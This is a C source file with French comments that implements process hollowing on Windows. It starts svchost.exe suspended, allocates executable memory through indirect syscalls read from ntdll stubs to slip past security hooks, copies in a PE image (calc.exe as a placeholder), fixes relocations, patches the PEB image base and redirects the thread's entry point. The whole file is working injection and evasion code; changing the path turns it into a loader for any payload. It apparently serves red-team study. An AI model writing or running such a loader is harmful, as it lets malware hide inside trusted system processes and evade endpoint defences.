#include <stdlib.h>
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include "structs.h"
#include "syscalls.h"


DWORD wNtAllocateVirtualMemory;
UINT_PTR sysAddrNtAllocateVirtualMemory;
DWORD wNtWriteVirtualMemory;
UINT_PTR sysAddrNtWriteVirtualMemory;


BOOL CreateSuspendedProcess(LPPROCESS_INFORMATION pi, LPCSTR processName) {
	STARTUPINFOA si = { 0 };

	if (!CreateProcessA(processName, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, pi)) {
		wprintf(L"[-] ERROR : Unable to create suspended process (error code : %lu)", GetLastError());
		return FALSE;
	}
	printf("[+] Process %s created with PID : %ld\r\n", processName, pi->dwProcessId);
	return TRUE;
}

BOOL LoadPe(LPCSTR peName, LPVOID* peContent, PDWORD sizeReturn) {
	HANDLE hPe = NULL;

	hPe = CreateFileA(peName, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	if (hPe == INVALID_HANDLE_VALUE || !hPe) {
		printf("[-] Error with opening process %s (error code : %lu)", peName, GetLastError());
		return FALSE;
	}

	*sizeReturn = GetFileSize(hPe, NULL);
	*peContent = LocalAlloc(LPTR, *sizeReturn);
	if (*peContent == NULL) {
		wprintf(L"[-] Error with peContent allocation (error code : %lu)", GetLastError());
		return FALSE;
	}

	if (!ReadFile(hPe, *peContent, *sizeReturn, NULL, NULL)) {
		wprintf(L"[-] Error with ReadFile (error code : %lu)", GetLastError());
		return FALSE;
	}
	printf("[*] %d bytes read in %s\r\n", *sizeReturn, peName);
	if (hPe) CloseHandle(hPe);
	return TRUE;
}

BOOL RetrieveNtHeaders(PIMAGE_NT_HEADERS64* ntHeader, LPVOID peContent) {
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)peContent; // récupère les dosheaders de pecontent
	if (dosHeaders->e_magic != IMAGE_DOS_SIGNATURE) {
		wprintf(L"[-] Error with header signature (error code : %lu)", GetLastError());
		return FALSE;
	}

	*ntHeader = (PIMAGE_NT_HEADERS64)((DWORD_PTR)dosHeaders + dosHeaders->e_lfanew);

	return TRUE;
}

BOOL CopyPE(HANDLE hProcess, LPVOID* allocAddrOnTarget, LPVOID peToInjectContent, PIMAGE_NT_HEADERS64 peInjectNtHeader,
	PIMAGE_SECTION_HEADER* peToInjectRelocSection)
{	

	// Je donne à mon imagebase la nouvelle adresse de la séction mémoire créée dans main
	peInjectNtHeader->OptionalHeader.ImageBase = (DWORD64)*allocAddrOnTarget;
	wprintf(L"[+] Writing header at new allocated address (allocaddrontarget)\r\n");

	HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
	UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];

	// on décale de +0x12 car c'est ici que se trouve l'instruction syscall de ntdll
	sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;

	// J'éris le header de mon pe à la nouvelle adresse afin que par la suite je puisse déplacer les sections
	/*if (!WriteProcessMemory(hProcess, *allocAddrOnTarget, peToInjectContent, peInjectNtHeader->OptionalHeader.SizeOfHeaders, NULL)) {
		wprintf(L"[-] Cannot write headers in target process (error code : %lu)", GetLastError());
		return FALSE;
	}*/

	NTSTATUS status = NtWriteVirtualMemory(hProcess, *allocAddrOnTarget, peToInjectContent,
		peInjectNtHeader->OptionalHeader.SizeOfImage, NULL);
	if (!NT_SUCCESS(status)) {
		wprintf(L"[-] Cannot write headers in target process (error code : %lu)", GetLastError());
		return FALSE;
	}


	wprintf(L"\t[+] Headers writtens at 0x%p\r\n", *allocAddrOnTarget);

	wprintf(L"[+] Writing sections into target process\r\n");

	for (int i = 0; i < peInjectNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER currentSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)peInjectNtHeader + // pointeur vers la section qui donne son type
			4 + // taille de la signature
			sizeof(IMAGE_FILE_HEADER) + // taille de l'en tête
			peInjectNtHeader->FileHeader.SizeOfOptionalHeader + //taille de l'en tête optionelle
			(i * sizeof(IMAGE_SECTION_HEADER))); // décale l'adresse pour pointeur sur l'adresse de la section

		// Si la section actuelle contient un .reloc
		if (!strcmp((char*)currentSectionHeader->Name, ".reloc")) {
			*peToInjectRelocSection = currentSectionHeader;
			wprintf(L"\t[*] Reloc table found at 0x%p offset\r\n", (LPVOID)(UINT64)currentSectionHeader->VirtualAddress);
		}

		if (!WriteProcessMemory(hProcess, (LPVOID)((UINT64)*allocAddrOnTarget + currentSectionHeader->VirtualAddress),
			(LPVOID)((UINT64)peToInjectContent + currentSectionHeader->PointerToRawData), currentSectionHeader->SizeOfRawData, NULL))
		{
			wprintf(L"[-] Cannot write section in the target process (error code : %lu)", GetLastError());
			return FALSE;
		}
		printf("\t[+] Section %s written at 0x%p\r\n", (LPSTR)currentSectionHeader->Name,
			(LPVOID)((UINT64)*allocAddrOnTarget + currentSectionHeader->VirtualAddress));

		// Si la section est un .text (code)
		if (!strcmp((char*)currentSectionHeader->Name, ".text"))
		{
			DWORD oldProtect = 0; //sauvegarde l'ancienne protection pour la restaurer plus tard 
			// Par défaut je n'ai pas le droit d'executer les sections text donc je fais virtualprotect pour les rendre
			if (!VirtualProtectEx(hProcess, (LPVOID)((UINT64)*allocAddrOnTarget + currentSectionHeader->VirtualAddress),
				currentSectionHeader->SizeOfRawData, PAGE_EXECUTE_READ, &oldProtect))
			{
				wprintf(L"[-] Error in changing permission on .text section to RX -> 0x%x", GetLastError());
				return FALSE;
			}
			printf("\t[+] Permissions changed to RX on .text section \r\n");
		}
	}
	if (hNtdll) FreeLibrary(hNtdll);
	return TRUE;
}

BOOL fixRelocTable(HANDLE hProcess, PIMAGE_SECTION_HEADER peToInjectRelocSection, LPVOID* allocAddrOnTarget, LPVOID peToInjectContent,
	DWORD64 deltaImageBase, IMAGE_DATA_DIRECTORY relocationTable)
{
	wprintf(L"[+] Fixing relocation table.\n");
	if (peToInjectRelocSection == NULL) {
		wprintf(L"[*] No reloc table\r\n");
		return TRUE;
	}

	DWORD relocOffset = 0;
	while (relocOffset < relocationTable.Size) {
		PBASE_RELOCATION_BLOCK currentReloc = (PBASE_RELOCATION_BLOCK)((PBYTE)peToInjectContent +
			peToInjectRelocSection->PointerToRawData + relocOffset);
		relocOffset += sizeof(IMAGE_BASE_RELOCATION);
		DWORD numberOfEntries = (currentReloc->BlockSize - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
		wprintf(L"[*] Number of reloc : %d\r\n", numberOfEntries);

		for (DWORD i = 0; i < numberOfEntries; i++) {
			PBASE_RELOCATION_ENTRY currentRelocEntry = (PBASE_RELOCATION_ENTRY)((PBYTE)peToInjectContent +
				peToInjectRelocSection->PointerToRawData + relocOffset);
			relocOffset += sizeof(BASE_RELOCATION_ENTRY);

			if (currentRelocEntry->Type == 0) continue;

			PVOID addressLocation = (PBYTE)*allocAddrOnTarget + currentReloc->PageAddress + currentRelocEntry->Offset;
			PBYTE patchedAddress = 0;

			if (!ReadProcessMemory(hProcess, (PVOID)addressLocation, &patchedAddress, sizeof(PVOID), NULL)) {
				wprintf(L"[-] Cannot read target process memory at %p (error code : %lu)", (PVOID)((UINT64)addressLocation), GetLastError());
				return FALSE;
			}
			wprintf(L"\t[+] Address To Patch: %p -> Address Patched: %p \r\n", (VOID*)patchedAddress, (VOID*)(patchedAddress + deltaImageBase));

			patchedAddress += deltaImageBase;

			if (!WriteProcessMemory(hProcess, (PVOID)addressLocation, &patchedAddress, sizeof(PVOID), NULL)) {
				wprintf(L"[-] ERROR: Cannot write into target process memory at %p, ERROR CODE: %x\r\n",
					(PVOID)((UINT64)addressLocation), GetLastError());
				return FALSE;
			}
		}
	}
	return TRUE;
}

int main() {
	PROCESS_INFORMATION pi = { 0 };
	LPCSTR targetProcess = "C:\\Windows\\System32\\svchost.exe";
	LPCSTR peName = "C:\\Windows\\System32\\calc.exe";
	DWORD peSize = 0;
	LPVOID peToInjectContent = NULL;
	PIMAGE_NT_HEADERS64 peInjectNtHeaders = NULL;
	PIMAGE_SECTION_HEADER peToInjectRelocSection = NULL;
	HANDLE hNtdll = GetModuleHandleA("ntdll.dll");

	if (!CreateSuspendedProcess(&pi, targetProcess)) goto __err;
	Sleep(1000);
	if (!LoadPe(peName, &peToInjectContent, &peSize)) goto __err;
	if (!RetrieveNtHeaders(&peInjectNtHeaders, peToInjectContent)) goto __err;


	// ici je créé une section mémoire dans laquelle je transfererai l'image, je lui alloue donc la taille de l'image
	PVOID allocAddrOnTarget = NULL;

	UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");

	/* Ici je vais chercher le numéro du syscall en décalant de 4 car c'est à l'octet suivant que se trouve
	l'octet unique de l'identifiant de la fonction. Je stocke cette valeur qui sera passée dans le registre EAX de l'asm*/
	wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];

	// on décale de +0x12 car c'est ici que se trouve l'instruction syscall de ntdll
	sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;

	SIZE_T regionSize = (SIZE_T)peInjectNtHeaders->OptionalHeader.SizeOfImage;
	
	NTSTATUS status = NtAllocateVirtualMemory(pi.hProcess, &allocAddrOnTarget, 0, &regionSize,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!NT_SUCCESS(status)) {
		printf("NtAllocateVirtualMemory failed with status: 0x%X\n", status);
		goto __err;
	}

	if (allocAddrOnTarget == NULL) {
		wprintf(L"[-] Error with allocAddrOnTarget allocation (Error code : %lu)", GetLastError());
		goto __err;
	}

	// Ici je créé deltaimagebase afin de donner la bonne adresse de mon pointeur précédemment créé, cela donne l'adresse du début pour les sections
	DWORD64 deltaImageBase = (DWORD64)allocAddrOnTarget - peInjectNtHeaders->OptionalHeader.ImageBase;
	if (!CopyPE(pi.hProcess, &allocAddrOnTarget, peToInjectContent, peInjectNtHeaders, &peToInjectRelocSection)) goto __err;

	IMAGE_DATA_DIRECTORY relocationTable = peInjectNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	if (!fixRelocTable(pi.hProcess, peToInjectRelocSection, &allocAddrOnTarget, peToInjectContent, deltaImageBase, relocationTable)) goto __err;


	CONTEXT CTX = { 0 };
	CTX.ContextFlags = CONTEXT_FULL;

	BOOL bGetContext = GetThreadContext(pi.hThread, &CTX);
	if (!bGetContext) {
		wprintf(L"[-] An error occured when trying to get the thread context.\n");
		goto __err;
	}

	BOOL bWritePEB = WriteProcessMemory(pi.hProcess, (PVOID)(CTX.Rdx + 0x10), &peInjectNtHeaders->OptionalHeader.ImageBase,
		sizeof(PVOID), NULL);
	if (!bWritePEB) {
		wprintf(L"[-] An error occured when trying to write the image base in the PEB.\n");
		goto __err;
	}

	wprintf(L"[*] EntryPoint address in RCX (CTX.Rcx) : 0x%llx\n",
		(DWORD64)allocAddrOnTarget + peInjectNtHeaders->OptionalHeader.AddressOfEntryPoint);


	CTX.Rcx = (DWORD64)allocAddrOnTarget + peInjectNtHeaders->OptionalHeader.AddressOfEntryPoint;


	BOOL bSetContext = SetThreadContext(pi.hThread, &CTX);
	if (!bSetContext) {
		wprintf(L"[-] An error occured when trying to set the thread context.\n");
	}

	ResumeThread(pi.hThread);
	FreeLibrary(hNtdll);
	return 0;

__err:
	if (pi.hProcess) TerminateProcess(pi.hProcess, -1);
	if (hNtdll) FreeLibrary(hNtdll);
	return -1;
}